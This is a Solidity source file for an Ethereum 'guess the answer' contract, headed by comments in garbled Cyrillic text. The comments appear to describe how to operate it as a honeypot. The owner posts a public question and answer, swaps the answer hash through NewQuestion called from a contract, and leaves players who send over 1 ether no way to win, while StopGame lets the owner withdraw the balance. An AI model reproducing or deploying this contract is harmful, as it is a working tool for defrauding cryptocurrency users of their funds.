// 1. §£§í§á§à§Ý§ß§Ú§ä§î StartGame §ã §Ü§à§ß§ä§â§Ñ§Ü§ä§Ñ §ã §á§å§Ò§Ý§Ú§é§ß§í§Þ§Ú §Õ§Ñ§ß§ß§í§Þ§Ú
// 2. §£§í§á§à§Ý§ß§Ú§ä§î NewQuestion §ã §Ü§à§ß§ä§â§Ñ§Ü§ä§Ñ
// 3. §µ§Ò§Ö§Õ§Ú§ä§ã§ñ §é§Ö§â§Ö§Ù web3 §é§ä§à §ç§ï§ê §á§à§Þ§Ö§ß§ñ§Ý§ã§ñ
// 4. §³ §á§Ñ§â§Ñ§Þ§Ö§ä§â§â§Ñ§Þ§Ú §á1. §£§í§á§à§Ý§ß§Ú§ä§î §Ü§à§Þ§Þ§Ñ§ß§Õ§å StartGame §ã §á§å§Ò§Ý§Ú§é§ß§à§Ô§à §Ñ§Ü§Ü§Ñ§å§ß§ä§Ñ

pragma solidity ^0.4.20;

contract GUESS_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    string public question;
 
    address questionSender;
  
    bytes32 responseHash;
 
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    
    function() public payable{}
}